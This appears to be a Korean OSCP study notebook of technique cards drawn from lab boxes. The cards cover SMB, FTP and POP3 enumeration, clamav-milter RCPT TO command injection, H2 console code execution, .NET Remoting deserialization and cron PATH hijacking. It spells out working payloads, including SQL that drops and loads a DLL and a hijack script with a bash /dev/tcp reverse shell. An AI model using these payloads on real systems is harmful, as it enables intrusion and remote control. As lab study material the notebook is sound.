smbclient -L //<타겟> -N          # 공유 목록 → share$ (guest ok=yes)
smbclient //<타겟>/share$ -N      # recurse ON; ls
```
`index.html`·`robots.txt`·`wordpress/` 가 그대로 노출 → `wp-config.php` 에서 DB 자격증명 회수. 그 자격증명의 원격 MySQL 접속이 막히는 이유는 A-24(에러 1130).

→ **`WRITE` 가 보이면 저장소가 아니라 «자격증명 덫»으로 쓸 것** — 미끼 파일 투하 + Responder 로 NetNTLMv2 를 걷는 경로가 B-57 임. 이 카드는 «익명 읽기» 공유가 웹루트인지를 보는 쪽이고 둘은 다른 수임.

#### B-28. `enum4linux -U` 가 비면 `rpcclient` 로 `S-1-22-1-<uid>` 를 역조회한다

**Samba 는 Unix 계정을 SAM RID(`S-1-5-21-…`)가 아니라 별도 네임스페이스에 둠** — `S-1-22-1-<uid>`(사용자) · `S-1-22-2-<gid>`(그룹). **`S-1-5-21-…-1000` 대역만 뒤지면 로컬 유닉스 계정은 영영 안 나옴.**

```bash
rpcclient -U '' -N <타겟> -c "lookupsids S-1-22-1-1000"
```
[[LazySysAdmin]] — `enum4linux -U` 가 Perl 경고만 뱉고 빈 결과였으나, 위 한 줄로 `S-1-22-1-1000` → **`Unix User\togie`** 가 나왔음. **빈 결과에서 포기하지 말 것**(A-11 — 자동 도구의 빈손은 부재의 근거가 아님).

#### B-29. FTP 로그인은 되는데 `LIST` 가 멈춘다 — PASV 를 의심한다

**`230 Login successful.` 인데 `ls`/`LIST` 가 타임아웃하면 자격증명이 아니라 «패시브 모드가 방화벽에 막힌 것»임.**

- 제어 채널(21)은 열려 있어 **로그인·명령은 통함**
- 패시브 모드는 **서버가 지정하는 고번호 데이터 포트로 클라이언트가 나가야** 하는데, 그 포트가 필터링돼 있으면 `LIST`/`RETR` 이 무한 대기

**해결 — 액티브 모드 강제.** `ftp -A`, 파이썬은 `ftplib.FTP.set_pasv(False)`. 액티브는 **클라이언트가 포트를 열고 서버가 그리로 접속**하므로 방향이 반대라 그 방화벽을 안 탐.

→ **「FTP 로그인 OK + LIST 멈춤」이면 자격증명·권한을 의심하기 전에 모드부터 바꿀 것.** 한 줄로 몇 분을 아낌([[Exghost]]).

#### B-2-10. 확장자 없는 백업 파일은 `file` 부터 — pcap 이면 그것이 정찰 자료다

**⑴ 이름으로 포맷을 넘겨짚지 말 것.** `backup` 이라는 이름에 tar/zip 을 기대해 `tar xf`·`unzip` 을 돌리면 **「손상된 아카이브」 에러**를 받고 파일 자체나 전송 과정을 의심하며 시간을 태움. [[Exghost]] 은 `file backup` 한 줄로 **pcap capture file** 임이 나왔음 — 954패킷짜리 pcap 이 tar 헤더를 흉내 낼 리 없으므로 그 미로를 통째로 건너뜀.

**⑵ pcap 이면 HTTP 바디를 통째로 카빙할 것.** `tshark --export-objects` 가 TCP 재조립·chunked/gzip 해제까지 자동으로 해 원본 파일 그대로 뽑아냄:
```bash
tshark -r <file> -Y http.request -T fields -e frame.number -e http.request.method -e http.host -e http.request.uri
tshark -r <file> --export-objects http,<dir>/
```
앞줄로 트랜잭션 목록만 먼저 훑고, 관심 가는 것이 있을 때만 뒷줄로 넘어갈 것.

**⑶ 핵심 통찰 — pcap 은 「과거의 서버가 지금은 안 주는 응답」을 냉동 보관함.** 라이브에서 403·인증벽에 막힌 엔드포인트라도, 캡처 당시(예: 개발자가 루프백에서 테스트하던 시점)의 파라미터명·버전 정보가 그대로 남아 있을 수 있음.
[[Exghost]] — 라이브 `/` 는 403 인데, 2022-01-27 캡처에는 개발자가 `127.0.0.1` 에서 폼 페이지를 연 `GET / 200` 이 들어 있었음. 954패킷 중 **HTTP 트랜잭션 2건**에서 셋을 전부 얻음:
1. 업로드 폼 HTML → 파라미터명 `myFile`, 액션 `exiftest.php`
2. 실제 POST 멀티파트 헤더 → `filename`·`Content-Type: image/jpeg` 검증 통과 형식
3. 서버 응답에 반사된 `ExifTool Version Number : 12.23` → **취약 버전 확정**(B-1-20)

이것이 **306,205건 브루트포스로도 못 찾은 진입점**이었음(A-23). → **「지금 못 보는 것」과 「과거에 보였던 것」을 구분할 것.**

#### B-2-11. clamav-milter black-hole 모드 RCPT TO 명령 주입 — CVE-2007-4560

**B-23**(OpenSMTPD `MAIL FROM`)의 형제 카드임 — **주소 필드 주입은 문자 제약을 먼저 계측한다**가 양쪽 공통 교훈임(A-39).

**탐지 신호** — 25/tcp 에 MTA 가 떠 있고, **배너에는 AV 가 한 줄도 안 나옴.** clamd(3310)도 milter 소켓도 TCP 로 노출되지 않음. 박스 이름을 근거로 파지 말고 **행동으로 판정할 것**:

- DATA 본문에 EICAR 테스트 문자열 한 줄을 넣고 `.` 을 보냄. `554 5.7.1 virus Eicar-Test-Signature detected by ClamAV` 가 돌아오면 **AV milter 가 인라인으로 붙어 있다**는 뜻이고, 그 순간 공격면이 MTA 에서 milter 로 옮겨감
- EICAR 는 실제 악성코드가 아니라 AV 동작 확인용 표준 테스트 문자열이라 이 확인에 그대로 씀

**메커니즘** — `--black-hole-mode` 는 「수신자 메일함이 어차피 `/dev/null` 이면 검사 비용을 아끼자」는 최적화임. 그러려면 수신자의 배달 방식을 먼저 알아야 하고, clamav-milter 는 그걸 `sendmail -bv <수신자>` 를 **`popen` 으로** 돌려 알아냄. 수신자 주소가 셸 명령줄에 문자열로 끼어들어가므로 `RCPT TO:` 의 셸 메타문자가 그대로 셸로 흐름.

> clamav-milter in ClamAV before 0.91.2, when run in black hole mode, allows remote attackers to execute arbitrary commands via shell metacharacters that are used in a certain popen call, involving the "recipient field of sendmail."
> — NVD, CVE-2007-4560

**표준 페이로드** — `RCPT TO: <nobody+"|<명령>"@localhost>`

- `nobody+` — 존재하는 로컬 사용자 + `+detail`. sendmail 이 주소를 정상 파싱해 `250 Recipient ok` 를 주게 하는 껍데기
- `"..."` — local-part 인용. SMTP 주소 문법상 공백·`/`·`;` 를 local-part 에 넣으려면 인용이 필요하고, 동시에 이 따옴표가 `popen` 문자열 안에서 셸의 인용을 여닫아 뒤의 `|` 를 셸이 해석하는 위치로 만듦. `[가정]` — 인용 없이 보내면 어떻게 되는지는 시험하지 않았음
- `|` — `popen` 문자열 안의 셸 파이프. sendmail 의 프로그램 배달(`|command` 별칭)이 **아님**
- `@localhost` — 로컬 배달로 잡히게 하는 도메인부

**milter 는 root 로 돎 → 처음부터 uid=0.** 권한상승 단계가 없음.

**시험에 전이되는 것 — CVE 번호가 아니라 부류임.** 2007년 CVE 라 같은 번호가 시험에 나올 일은 없음. 전이되는 것은 ①「필터·헬퍼 프로세스가 사용자 입력을 셸에 넘긴다」는 **부류**와 ②블라인드 RCE 를 오라클로 계측하는 반사신경(B-87)임. OSCP 범위에서 이 부류는 **메일·프린터·백업 에이전트·안티바이러스 같은 보조 데몬**에서 나옴 — 주 서비스가 아니라 그 뒤에 붙은 헬퍼를 볼 것.

**작업 디렉터리가 `/tmp` 가 아님.** clamav-milter 는 `/tmp/clamav-<hash>/` 를 만들고 **그 디렉터리가 프로세스의 cwd** 이며 메시지 본문을 `msg.XXXXXX` 로 거기 씀(Metasploit 모듈 주석). 모듈 페이로드가 `sh msg*` 라는 **상대경로**인 이유가 그것임. 이 사실을 모르고 `/tmp/x.sh` 를 쓰면 **조용히 아무 일도 안 일어남** — A-39 ③.

**수동 대안(msf 1대 제한 대비)** — 파이썬 30줄이면 됨. `nc 타겟 25` 로 손으로 쳐도 됨:
```text
HELO x
MAIL FROM: <>
RCPT TO: <nobody+"|<명령>"@localhost>
DATA
.
```
**내려받기가 아예 안 되는 상황이면 모듈 수법을 흉내낼 것** — `From:` 헤더에 명령을 넣으면 그게 milter 작업 디렉터리에 `msg.XXXXXX` 로 먼저 쓰이므로, 주입 명령을 `sh msg*` 로 두고 실제 페이로드를 헤더에 실을 수 있음. 이 박스에서는 **시도하지 않았고**, 근거는 모듈 소스 주석임.

**방어** — 0.91.2 이상으로 올림. 안 되면 black hole 모드를 끔(이 결함은 그 모드에서만 남). milter 를 `clamav` 전용 계정으로 돌림. 외부 입력을 셸 문자열에 이어붙여 `popen` 하지 말고 인자 배열로 `execve`.
⚠️ NVD 는 `before 0.91.2`, Rapid7 모듈 설명은 `prior to v0.92.2` 로 적음 — **어느 쪽이든 0.91 은 취약**임. 설치 버전과 실행 바이너리 버전이 갈리는 함정은 A-13.

— 출처: [[ClamAV]]

#### B-2-12. 번들 스택의 구성요소가 «돈다»고 가정하지 말 것

**XAMPP·LAMP·WAMP·XAMPP-VM 배너는 「무엇이 번들됐는지」의 정보지 「무엇이 돌고 있는지」가 아님.** 「XAMPP 배너 = MySQL 있음」·「LAMP = MySQL 있음」은 배포판이 무엇을 담는가의 이야기임.

**확인은 세 줄이면 끝남 — 셋 다 빈손이면 배제:**

| 축 | Windows | Linux |
|---|---|---|
| 서비스 | `sc.exe qc <이름>` | `systemctl status <이름>` |
| 프로세스 | `tasklist \| findstr` | `ps aux \| grep` |
| 소켓 | `netstat -ano \| findstr <포트>` | `ss -lntp` |

**그 위에 한 층 더 있음 — 앱이 그 DB 를 쓰기는 하는가.** 플랫파일 CMS(Monstra · Grav · Kirby · Flextype)를 만나면 **DB 축이 통째로 없음.**

[[Monster]] — `Apache 2.4.41 + PHP 7.3.10 + Win64` 배너로 XAMPP 를 **맞게** 특정하고도 「MySQL 도 돌겠지」를 공짜로 얹은 것이 이 박스에서 제일 오래 붙든 오답이었음(서비스·프로세스·소켓 전부 빈손 — `Win32_Service` 빈 결과 · `sc.exe qc mysql` → 1060). 게다가 Monstra 는 애초에 DB 를 안 쓰는 플랫파일 CMS 였음.
→ **관측(배너)이 옳아도 거기 붙인 결론이 틀릴 수 있음**(A-61).

**상태 «페이지»가 렌더한 포트도 마찬가지임.** [[Squid]] — WampServer 홈페이지가 `MariaDB Version: 10.4.13 - Port defined for MariaDB: 3307` 을 렌더했으나 **3307 은 미기동**이었음. 근거는 프록시 포트 스윕 산출물(`proxyscan.txt`)에 3307 라인이 «아예 없는» 것 — 그 스크립트는 503·000 을 출력에서 제외하므로 **부재 = 연결 실패**임. 같은 스택의 MySQL 5.7.31(3306)만 살아 있었음.
→ **설정 파일·상태 페이지가 말하는 것은 「의도」이지 「현실」이 아님.** 번들 스택은 구성요소를 다 선언해 놓고 일부만 기동하는 것이 정상 동작임(같은 계열 — [[Hawat]] 의 「소스와 배포본이 다르다」, A-2-13).

#### B-2-13. POP3 · IMAP (110 · 143) — 메일함은 셸이 아니라 «다음 자격증명이 평문으로 적혀 있는 곳»이다

**판단 신호** — `nmap` 의 `pop3-capabilities` 에 **`USER`** 가 있으면 평문 `USER`/`PASS` 인증을 받는다는 뜻임. `SASL(PLAIN)` 이 같이 있으면 TLS 없이 평문 인증이 허용된 것. 이게 없으면 SASL 만 남아 스프레이 스크립트를 다르게 짜야 함.

**손으로 되는 명령은 넷뿐** — `USER` · `PASS` · `LIST` · `RETR <n>`. 도구가 없어도 막히지 않음.
```bash
(printf 'USER <u>\r\nPASS <p>\r\nLIST\r\n'; sleep 4; \
 printf 'RETR 1\r\n'; sleep 3; printf 'RETR 2\r\n'; sleep 3; \
 printf 'QUIT\r\n'; sleep 2) | nc <TARGET> 110
```
- `sleep` 이 필요한 이유 — 파이프로 몰아넣으면 클라이언트가 응답을 기다리지 않고 전부 밀어버림. POP3 는 파이프라이닝을 지원하지만 `nc` 는 응답을 다 받기 전에 EOF 로 연결을 닫아 **출력이 잘림**
- `USER` 응답이 그냥 `+OK` 라는 것은 **계정이 있든 없든 같다**는 뜻이라 사용자 열거에는 못 씀
- 성공 `+OK Logged in.` / 실패 `-ERR [AUTH] Authentication failed.`
- ⚠️ 스프레이가 N번째에서 타임아웃으로 죽으면 차단이 아니라 **Dovecot 사전 지연**임(A-2-28)

**읽는 법** — 메일 본문에서 찾을 것은 ①임시·초기 비밀번호 ②수신자 목록(= 다음 스프레이 대상) ③「아직 안 읽었다」류의 진술.
[[Fowsniff]] 실측 — 1번 메일이 전 직원 8명에게 SSH 임시 비번 `S1ck3nBluff+secureshell` 을 평문으로 뿌렸고, 2번 메일에서 `baksteen` 이 「Stone 메일 아직 안 읽었다」고 써 **그 계정이 비번을 안 바꿨다는 신호**가 됨. 실제로 SSH 스프레이 9명 중 `baksteen` 만 통과.
⚠️ **신호를 믿고 하나만 찔러볼 이유는 없음** — 수신자 전원을 돌릴 것. 비용이 거의 없음.

**자격증명 재사용 체인의 전형임** — 유출 덤프 → 크랙 → 메일 → SSH. **각 단계에서 살아남는 계정이 하나씩만 바뀜**([[Fowsniff]]: 덤프 9개 → 크랙 8개 → 메일 로그인 1개 → SSH 1개). 한 단계의 「전멸」이 다음 단계의 전멸을 뜻하지 않으므로 **매 단계 전량을 다시 돌릴 것**(A-24).

**시험 관점** — POP3 는 netcat, 해시 크랙은 john/hashcat(둘 다 허용), SSH 스프레이는 `for` 루프 + `sshpass`. 이 부류는 **금지 도구를 쓸 일이 없음**(E 절). hydra 도 허용이지만 대상이 10개 안쪽이면 손으로 도는 편이 빠름.

**출처** — [[Fowsniff]]. 해시 쪽은 B-6-11.

#### B-2-14. H2 Database Console — 콘솔 접속 = 코드 실행 (CSVWRITE + CREATE ALIAS + JNI)

**신호** — 비표준 고포트에 `H2 database http console`(기본 8082). nmap 이 이름을 붙여줌. 80 에 `http-title: H2 Database Engine (redirect)` 만 있으면 그쪽은 **문서 사이트**임(A-16).

**콘솔의 「로그인」은 인증이 아니라 JDBC 접속 파라미터 입력창임.** 기본값 `org.h2.Driver` + `jdbc:h2:~/test` + `sa` + **빈 비밀번호**로 그대로 붙음. 임베디드 모드에서는 없는 DB 가 접속 시점에 생성되고 소유자 자격증명이 입력값으로 정해지므로 **자격증명을 맞힐 필요가 아예 없을 수 있음** `[가정]`(H2 의 알려진 동작이나 [[Jacko]] 에서 확인하지 않음). **비밀번호 칸이 있다고 그 뒤에 지켜야 할 무언가가 있는 것이 아님**(A-25 의 반대 방향).

**EDB 49384(CVE 없음 — `Codes: N/A`).** 패치 대상 버그가 아니라 **정상 기능 오용**임. ⚠️ 「CVE 가 없다」에서 **「어느 버전에서나 통한다」로 넘어가지 말 것** — 별개의 주장이고 [[Jacko]] 에서 확인된 것은 `1.4.199` 하나임(익스플로잇 헤더도 `Tested on: … H2 1.4.199`) `[가정]`. 3단계:
1. `SELECT CSVWRITE('C:\Windows\Temp\JNIScriptEngine.dll', CONCAT('SELECT NULL "', CHAR(0x4d),CHAR(0x5a),…,'"'), 'ISO-8859-1', '', '', '', '', '')` — CSV **헤더 줄에 컬럼 이름이 들어가는 것**을 이용해 별칭 자리에 PE 바이트를 실음. `'ISO-8859-1'` 은 0x00–0xFF 가 바이트와 1:1 인 인코딩이라야 하기 때문(UTF-8 이면 0x80 이상이 2바이트로 부풀어 PE 가 깨짐). 뒤의 다섯 `''` 는 구분자·인용부호·이스케이프·NULL 표기를 전부 비워 헤더 외 문자가 안 섞이게 함
2. `CREATE ALIAS System_load FOR "java.lang.System.load"; CALL System_load('…dll');` — **응답 `null` 이 정상**(반환값 없음). 예외가 안 난 것이 성공 신호임(A-12)
3. `CREATE ALIAS JNIScriptEngine_eval FOR "JNIScriptEngine.eval"; CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec("<cmd>").getInputStream()).useDelimiter("\\Z").next()');`

`CREATE ALIAS … FOR "<완전한 자바 메서드명>"` 은 **자바 컴파일러가 필요 없는** 형태임 — H2 의 인라인 소스 컴파일 경로는 **JDK 가 있어야** 하고 타겟에 JRE 만 있으면 실패함. JNI 경로가 그 의존성을 우회함(B-86 의 「타겟에 컴파일러가 없다」와 같은 제약).

⚠️ **`Runtime.exec` 는 셸이 아님** — 한 번에 한 프로세스, 파이프·리다이렉션·`&&` 전부 안 먹음(셸을 거치지 않음). stdout 만 문자열로 돌아옴. 그래서 **다운로더(certutil)와 페이로드 실행을 «두 번»의 `CALL` 로 쪼갤 것.** `useDelimiter("\\Z")` 는 출력 전체를 한 토큰으로 읽는 관용구(없으면 첫 공백까지만 옴)이고, `getInputStream()` 덕에 **성공 여부를 그 자리에서 확인**할 수 있음(블라인드가 아님).

**일반화 — DB 콘솔을 잡으면 곧장 「파일 쓰기 → 코드 실행」을 찾을 것.** 엔진마다 이름만 다르고 발상은 같음:

| 엔진 | 프리미티브 |
|---|---|
| H2 | `CSVWRITE` + `CREATE ALIAS`(+ JNI) |
| MSSQL | `xp_cmdshell` |
| MySQL | `INTO OUTFILE` + UDF |
| PostgreSQL | `COPY … PROGRAM` |

**출처** — [[Jacko]](H2 1.4.199, tcp/8082). 나온 셸의 PATH 함정은 A-3-11.

#### B-2-15. 모르는 서비스를 만났을 때의 절차 — ZooKeeper 4자 명령이 그 표본

**순서를 고정해 둘 것. 순서가 없으면 한 서비스에 매몰됨:**

1. **포트 번호가 아니라 제품명으로 검색할 것** — `2181` 은 수천 건, `Apache ZooKeeper` 는 정확한 문서
2. **그 제품의 「관리·웹 UI」가 «별도 제품»으로 있는지 확인할 것** ← 대개 여기서 답이 나옴. ZooKeeper 자체는 웹 UI 가 없고 관리 UI 는 별개 제품(Exhibitor)임
3. **배너로 직접 말을 걸 것** — 프로토콜에 진단 명령이 있으면 그것이 무료 정찰임
4. **검색어를 조합할 것** — `<제품명> <버전> exploit` · `<제품명> default credentials` · `<제품명> unauthenticated`

**ZooKeeper 4자 명령(four-letter words) — 3번의 구체형:**
```bash
echo srvr | nc TARGET 2181   # 버전·모드
echo envi | nc TARGET 2181   # 환경변수·경로 (정보 유출)
echo stat | nc TARGET 2181   # 연결 클라이언트
echo mntr | nc TARGET 2181   # 메트릭
```
3.4.6 은 4자 명령에 화이트리스트가 없어 `envi` 가 `java.home`·`user.dir` 같은 **경로 정보를 그대로 줌.**

[[Pelican]] 은 **2번에서 끝났음** — ZooKeeper 가 아니라 Exhibitor 가 답이었음(B-1-10).

**손절 기준 — 제품 식별에 15분.** 안 나오면 다른 포트로 옮겼다가 돌아올 것. **한 서비스에 매몰되는 것이 24시간 시험에서 가장 흔한 실패 형태임**(D 절).

#### B-2-16. .NET Remoting 은 그 자체로 무인증 역직렬화 엔드포인트다

**신호** — `nmap -sV` 가 `remoting MS .NET Remoting services` 라고 적음(기본 포트 예: SmarterMail 17001). 웹 포트가 아니라 **바이너리 RPC 포트가 진짜 입구**인 부류임.

**왜 그 자체로 취약점 후보인가**
- .NET Remoting 은 .NET Framework 1.0~2.0 시대의 원격 객체 호출 프레임워크(자바 RMI·CORBA 와 같은 계보). 서버가 객체를 URI 로 등록(`tcp://host:17001/Servers`)하고, 클라이언트가 로컬 객체처럼 메서드를 부르면 프레임워크가 인자를 직렬화해 TCP 로 보내고 서버가 역직렬화해 실제 메서드를 호출함
- **「인자를 역직렬화」하는 부분이 기본적으로 `BinaryFormatter`** — 즉 TCP 채널이 설계상 원격 역직렬화 엔드포인트임
- **인증이 선택 사항** — 기본 구성에서 TCP 채널은 누구나 연결해 객체를 보낼 수 있음
- **역직렬화가 메서드 호출 «전»에 일어남** — 인증 로직이 있어도 소용없음. 인자를 풀어야 인증 메서드를 부를 수 있으므로 인증 전에 이미 코드가 실행됨
- `typeFilterLevel` 이 `Low` 면 델리게이트 계열 가젯이 차단되지만 `Full` 로 올려놓은 애플리케이션이 흔함. SmarterMail 이 그랬음 `[가정]` — 근거는 「페이로드가 델리게이트 가젯을 쓰는데 성공했다」는 사실
- Microsoft 가 2010년대 초 사용 중단을 권고했고 .NET Core 는 아예 지원하지 않으나, **레거시 제품에는 그대로 남아 있음**

**반사 순서**
1. 어떤 제품이 이 포트를 열었는가 — 다른 포트의 웹 UI·배너에서 제품명 확보
2. `searchsploit <제품명>` — 역직렬화 익스플로잇이 있는가
3. 없으면 `ysoserial.net`(가젯 생성) + `ExploitRemotingService`(James Forshaw) 조합을 직접 시도

**전송 계층 — HTTP 가 아님.** 프레임은 `.NET` 매직 4바이트로 시작함:
```python
msg  = b'.NET'                 # Header
msg += b'\x01' + b'\x00'       # Version Major / Minor
msg += b'\x00\x00'             # Operation Type
msg += b'\x00\x00'             # Content Distribution
msg += pack('I', len(payload)) # Data Length (리틀엔디언 4바이트)
msg += b'\x04\x00'             # URI Header
msg += b'\x01' + b'\x01'       # Data Type / Encoding = UTF8
msg += pack('I', len(uri))     # URI Length
msg += uri                     # tcp://<타겟>:17001/Servers
msg += b'\x00\x00'             # Terminating Header
msg += payload                 # 직렬화 데이터
```
— 출처: `~/PG/Algernon/exploit_algernon.py`(EDB 49216)

- **같은 바이트를 웹 포트로 보내면 IIS 가 `400 Bad Request - Invalid Verb` 를 뱉음.** 「익스플로잇이 안 먹힌다」로 오판하는 지점임
- URI 의 마지막 조각(`/Servers`)이 등록된 원격 객체 이름이라 제품마다 다름. SmarterMail 은 `/Servers`·`/Mail`·`/Spool` 셋을 노출함(출처: msf `smartermail_rce.rb` 모듈 설명)
- `struct.pack('I', n)` 은 **호스트 바이트 순서**라 x86/x64 에서 리틀엔디언임. 엄밀히는 `'<I'` 가 정확하나 Kali(x86_64)에서 돌리는 한 결과가 같음

**같은 반사가 필요한 다른 신호** — 8009 AJP(Ghostcat) · 1099 Java RMI · 4848 GlassFish · ViewState 가 붙은 ASP.NET 폼 · Telerik `Telerik.Web.UI.WebResource.axd`.
⚠️ **Telerik 역직렬화는 이 박스의 취약점이 «아님».** 비교 사례로만 언급할 것 — [[Algernon]] 노트에 그 CVE 번호가 한때 잘못 붙어 색인이 오염된 이력이 있음([[_WRITEUP-STANDARD]] `manual_cves` 절).

**출처** — [[Algernon]](SmarterMail 17001, CVE-2019-7214).

#### B-2-17. ftp-anon 을 보면 «먼저» 통째로 받는다

**`ftp-anon: Anonymous FTP login allowed` 가 뜨면 판단하지 말고 재귀로 다 받을 것.** 크기가 작으면 몇 초이고, 시험장에서 「나중에 봐야지」 하고 넘긴 익명 FTP 가 **유일한 자격증명 출처**인 경우가 실제로 있음.
```bash
wget -m --no-passive-ftp ftp://anonymous:anonymous@<타겟>/
# LIST 가 멈추면 패시브 모드 문제 — B-29
```

**디렉터리 «이름»이 제품을 지목함.** [[Algernon]] — nmap 이 넷을 보여줬고 그 조합이 SmarterMail 데이터 디렉터리의 시그니처였음:
```text
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-29-20  10:31PM       <DIR>          ImapRetrieval
| 08-19-26  06:57PM       <DIR>          Logs
| 04-29-20  10:31PM       <DIR>          PopRetrieval
|_04-29-20  10:32PM       <DIR>          Spool
```
— 출처: `~/PG/Algernon/nmap.log`

즉 **FTP 루트가 메일 스풀에 그대로 붙어 있음.** 노릴 것:

| 디렉터리 | 노려볼 것 |
|---|---|
| `Spool` | 평문 `.eml` 메일 본문. 자격증명·초대 링크·내부 호스트명이 메일에 적혀 있는 경우가 흔함(B-2-13) |
| `Logs` | 로그인 시도에 계정명이 남아 **사용자 열거**가 됨. 타임스탬프가 최근이면 활성 로그 |
| `ImapRetrieval` / `PopRetrieval` | 외부 메일 계정 수집 설정 — 저장된 외부 계정 자격증명 |

⚠️ **`ls -la` 의 타임스탬프를 읽을 것** — [[Algernon]] 은 셋이 `04-29-20`(설치 시점)인데 `Logs` 만 `08-19-26`(전날)이라 **살아 있는 것이 무엇인지**가 그 한 줄로 갈렸음.
⚠️ **다만 더 빠른 경로가 있으면 2순위로 둘 것.** [[Algernon]] 은 17001 경로가 압도적으로 빨라 FTP 를 손대지 않았고 그것이 옳았음 — 「무조건 받아라」는 **비용이 0 에 가까울 때**의 규칙임.

**출처** — [[Algernon]](SmarterMail 스풀, 미사용 대안 경로).

#### B-2-18. nmap `SERVICE` 열은 «전송 계층» 이름일 수 있다 — 첫 검색어는 포트 번호

B-2-15 가 「제품을 특정한 뒤」의 절차라면 이것은 **그 앞 단계**임 — nmap 이 적은 이름이 제품이 아니라 **그 아래 전송 프로토콜**일 수 있음. `?` 가 붙지 않아도 그럼(A-11 은 `?` 붙은 경우).

[[Twiggy]] — nmap 이 4505/4506 을 `zmtp`(ZeroMQ ZMTP)로 표시함. `zmtp` 는 「HTTP」와 같은 층위의 답이라 **그 위에 뭐가 도는지**(WordPress 냐 Jenkins 냐)를 말해주지 않음. `"Zeromq ZMTP 2.0 exploit"` 로 검색하니 상위 3건이 전부 libzmq **라이브러리 자체**의 문제(HackerOne #477073 · CVE-2014-9721 · zeromq/libzmq issue 3351)로 이 박스와 무관했고, 4번째에서야 Exploit-DB 48421 `Saltstack 3000.1 RCE` 가 나왔음. 약 30분 손실 `[가정]`, 포트 번호로 시작했으면 5분.

**검색어 우선순위:**
```text
① 포트 번호 그 자체 ("4505" "4506")   ← 제품을 특정함. 가장 먼저
② 정확한 버전 문자열
③ HTTP 타이틀·배너 문자열
④ SERVICE 열의 이름                    ← 가장 마지막. 전송 계층 이름일 수 있음
```
A-11 의 「nmap 출력에서 검색어를 뽑는 우선순위」가 **한 출력 «안»에서 고르는 법**이라면, 이 목록은 **검색창에 무엇을 먼저 칠 것인가**임.

**외워둘 포트 쌍** — 공통 구조는 「인증 없이 관리 평면에 닿는다」임:
```text
4505 / 4506   SaltStack salt-master        6379         Redis
8000          salt-api · Django dev        2375 / 2376  Docker API
5985 / 5986   WinRM                        11211        memcached
9200          Elasticsearch                8500         Consul
```

⚠️ **frontmatter 오염 주의** — 「무관하다」고 설명하려 적은 CVE 번호(위 CVE-2014-9721)도 `extract.py` 의 정규식이 본문 어디서든 긁어감. 반증용으로 적은 번호가 있으면 노트에 `manual_cves: true` 를 선언할 것(`CLAUDE.md` §5).

#### B-2-19. 루프백에 열린 무인증 JMX 는 그 자체로 권한상승 후보다

**Cassandra·Tomcat·Kafka·Elasticsearch 계열 자바 서비스의 JMX 포트(Cassandra 기본 7199)는 기본 설정에서 «인증 없이 루프백에» 열림**(`LOCAL_JMX=yes`). JMX 는 MBean 을 통한 원격 코드 실행 경로가 알려져 있고, **그 서비스가 도는 계정을 그대로 얻음.**

루프백 전용이라 외부 nmap 에는 원리적으로 안 잡힘 — 셸을 잡은 뒤 `ss -lntp`/`netstat -tulpn` 의 `127.0.0.1:*` 줄에서만 보임(A-44). 꺼내는 것은 포트포워딩임(B-71):
```bash
ssh -L 7199:127.0.0.1:7199 <user>@<타겟>          # SSH 가 되면
./chisel client <KALI>:8000 R:7199:127.0.0.1:7199 # 안 되면 chisel
```
[[Clue]] — root 획득 «후»에 발견해 결과적으로 무의미했으나, `sudo -l` 이 비어 있었다면 **이것이 다음 후보**였음.
→ **일반화: `netstat -tulpn` 의 `127.0.0.1:*` 줄은 전부 「아직 안 본 공격면」임**(A-44). 특히 **자바 서비스가 도는 박스에서 고번호 루프백 포트를 보면 JMX 를 먼저 의심**할 것.

### B-3. 리눅스 권한상승

#### B-31. 크론 기반 권한상승

**탐지** — `crontab -l` · `/etc/crontab` · `/etc/cron.*` · `ls -la` 로 **쓰기 가능한 스크립트** 확인. `harvest.sh` 가 3종을 한 번에 걷음.

**출처** — [[Astronaut]] · [[Exfiltrated]] · [[Muddy]] (누적 패턴) · [[Assignment]](`/usr/bin/clean-tmp.sh`, root 개인 crontab 이라 안 보였음 — A-45)

**⑵ PATH 순서 하이재킹 — 쓰기 가능한 스크립트가 없어도 성립함.**

크론 `PATH=` 줄을 **왼쪽부터** 읽을 것. 셸이 절대경로 아닌 이름(`netstat` 등)을 만나면 PATH 를 순서대로 순회해 **첫 번째로 발견한 것을 실행하고 탐색을 멈춤.**
⛔ **결함의 본체는 「절대경로 미사용」이 아니라 «쓰기 가능한 디렉터리가 PATH 앞쪽에 있는 것»임** — `PATH=/sbin:/bin:/usr/sbin:/usr/bin` 처럼 root 전용 디렉터리로만 구성되면 절대경로 미사용은 무해함.

**판정 순서** ①`PATH=` 줄을 읽음 → ②각 디렉터리에 `ls -ld` 로 쓰기 권한 확인 → ③쓰기 가능한 것이 진짜 경로보다 **앞**에 있으면 성립.
```bash
echo $PATH | tr ':' '\n' | xargs -I{} ls -ld {} 2>/dev/null
find / -writable -type d 2>/dev/null | head -50
```
단골: `/dev/shm`·`/tmp`·`/var/tmp`·`/var/www`·홈 디렉터리·`/opt/scripts` 류. **`/dev/shm` 은 `noexec` 가 안 걸린 경우가 많아 실행 파일 배치가 가능** — `mount | grep shm` 으로 확인할 것(`noexec` 면 이 공격 실패).

**⛔ 하이재킹 바이너리는 «원래 동작을 보존»할 것.** 크론이 `&&` 체인이면 가짜 바이너리가 0 아닌 종료 코드를 반환할 때 뒤가 안 돌아 관리자가 결과물(예: `/root/status`)로 눈치챔:
```bash
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' &
exec /usr/bin/netstat "$@"
```

| 조각 | 역할 |
|---|---|
| `#!/bin/bash` | 셔뱅 필수. 없으면 `sh` 가 텍스트 파일 실행에 실패하거나 bash 전용 문법(`>&`)이 안 먹음 |
| `bash -c '...' &` | 리버스셸을 **백그라운드로.** 없으면 크론이 셸 종료를 기다려 다음 주기까지 산출물이 안 갱신돼 탐지됨 |
| `exec` | 현재 프로세스를 **진짜 바이너리로 교체** — fork 안 해서 PID·종료 코드가 그대로 호출자에게 전달 |
| `/usr/bin/netstat`(절대경로) | 상대경로를 쓰면 **자기 자신을 다시 부르는 무한 재귀**(PATH 맨 앞이 자기 위치이므로) |
| `"$@"` | 원래 인자를 그대로 전달. 큰따옴표 없으면 공백 든 인자가 쪼개짐 |

**무반응이면 순서대로 의심** — ①`chmod +x` 누락(**가장 흔함** — 실행 비트가 없으면 PATH 탐색이 후보로 안 치고 진짜 바이너리가 정상 실행돼 **에러도 안 남**) ②셔뱅 누락 ③`noexec` 마운트 ④아웃바운드 포트 차단.
→ **리버스셸 대신 `id > /dev/shm/marker` 로 먼저 검증하면 ①~③과 ④가 분리됨**(A-31 의 계층 분리).
